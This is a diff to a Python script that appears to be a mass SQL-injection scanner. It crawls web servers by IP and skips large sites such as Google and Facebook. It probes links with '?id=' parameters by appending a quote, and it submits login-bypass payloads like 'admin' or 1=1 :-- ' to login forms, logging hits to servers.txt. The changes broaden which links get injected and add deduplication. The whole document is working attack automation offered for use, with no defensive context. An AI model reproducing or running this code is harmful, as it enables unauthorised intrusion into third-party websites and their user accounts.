@@ -23,7 +23,7 @@ def gethref(url):
     try:
         req = requests.get(ur, timeout=6)
         soup = BeautifulSoup(req.text, 'html.parser')
-        for link in soup.select('a[href*=".php?id="]'):
+        for link in soup.select('a[href*="?id="]'):
             okay = (link["href"])
             serv = (ur + okay + "'")
             reeqee = requests.get(serv, timeout=6)
@@ -128,8 +128,9 @@ def loginsql(site, user_field, password_field, USERS, PASSWORDS, title, html_con
 
 def title(ip):
 	url = ("http://" + ip + "/")
+	sitelists = []
 	#print("[+] Deep looking: " +url)
-	blacklist = ['*stackoverflow*', '*google*', '*instagram*', '*facebook*' ,'*youtube*', '*twitter*','*tiktok*','*snapchat*','*gmail*','*amazon*', '*nginx*']
+	blacklist = ['*stackoverflow*', '*google*', '*yahoo*', '*instagram*', '*facebook*' ,'*youtube*', '*twitter*','*tiktok*','*snapchat*','*gmail*','*amazon*', '*nginx*']
 	try:
 		rqt = requests.get(url, timeout=6, verify=True)
 		soupr = BeautifulSoup(rqt.content, 'html.parser')
@@ -139,19 +140,25 @@ def title(ip):
 			site = str(site)
 			if any([fnmatch.fnmatch(site, filtering) for filtering in blacklist]):
 				continue
-			print("[!] Found Branch: " site)
-			try:
-				r = requests.get(site, timeout=6, verify=True)
-				soup = BeautifulSoup(r.content, 'lxml')
-				title = (soup.select_one('title').text)
-				USERS = ("admin' or 1=1 :-- ")
-				PASSWORDS = ("1' or 1=1 -- -")
-				user_field = ("username")
-				password_field = ("password")
-				print("[+] Branched scan: " + url + " : " + title + "  [+]")
-				kkk = open("servers.txt", "a").write(ip + " " + title + "\n")
-				loginsql(site, user_field, password_field, USERS, PASSWORDS , title, r.text)
-			except:
+			print("[!] Found Branch: " +site)
+			if site not in sitelists:
+				try:
+					r = requests.get(site, timeout=6, verify=True)
+					soup = BeautifulSoup(r.content, 'lxml')
+					title = (soup.select_one('title').text)
+					USERS = ("admin' or 1=1 :-- ")
+					PASSWORDS = ("1' or 1=1 -- -")
+					user_field = ("username")
+					password_field = ("password")
+					print("[+] Branched scan: " + url + " : " + title + "  [+]")
+					kkk = open("servers.txt", "a").write(ip + " " + title + "\n")
+					sitelists.append(site)
+					print(sitelists)
+					print("Appended branch: " + site) 
+					loginsql(site, user_field, password_field, USERS, PASSWORDS , title, r.text)
+				except:
+					pass
+			else:
 				pass
 	except:
 		pass
@@ -184,3 +191,4 @@ def main():
 			title(ip)
 
 main()
+
